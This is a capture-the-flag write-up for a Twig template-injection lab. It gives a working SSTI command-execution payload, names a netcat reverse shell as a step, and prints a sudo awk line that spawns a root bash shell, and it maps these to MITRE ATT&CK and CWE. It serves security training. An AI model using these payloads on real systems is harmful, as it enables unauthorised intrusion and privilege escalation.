# Maq170: StormTroopers (SSTI)

> **Platform:** SEC4US CTF Lab | **Category:** Web: Template Injection | **Points:** Dynamic

## Overview

Web application using the Twig template engine with user-controlled input in a cookie value, combined with sudo awk for privilege escalation.

---

## Approach

**Technique:** Twig SSTI via Cookie + Sudo Awk Privesc

### Reconnaissance

```bash
nmap -sV -sC -p- <TARGET_IP> -oN nmap_full.txt
```

### Exploitation

1. **SSTI detection:** The application sets a token cookie that is rendered through Twig. Test with `{{7*7}}` to confirm template injection
2. **RCE via SSTI:** Use Twig-specific payloads to achieve command execution:
   ```
   {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
   ```
3. **Reverse shell:** Escalate from SSTI to a full reverse shell as the web user
4. **SSH credentials:** Discover SSH credentials on the filesystem
5. **Sudo awk privesc:** The SSH user has sudo permissions for `awk`. Use GTFOBins technique:
   ```bash
   sudo awk 'BEGIN {system("/bin/bash")}'
   ```

### Tools Used

Burp Suite, curl, Twig SSTI payloads, GTFOBins (awk), netcat

---

## Security Frameworks

### MITRE ATT&CK

| Technique | Description |
|-----------|-------------|
| T1190 | Exploit Public-Facing Application |
| T1548.003 | Sudo and Sudo Caching |

### CWE

| ID | Description |
|----|-------------|
| CWE-1336 | Improper Neutralization of Special Elements in Template Engine |

---

## Author

**Andre Henrike** (@mrhenrike)

Templates are powerful. Unsanitized templates are powerful for the attacker. Thanks guys!! (❍ᴥ❍ʋ)

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike

---

*For educational purposes only. Do not use any technique shown here against systems you do not own or have explicit permission to test.*
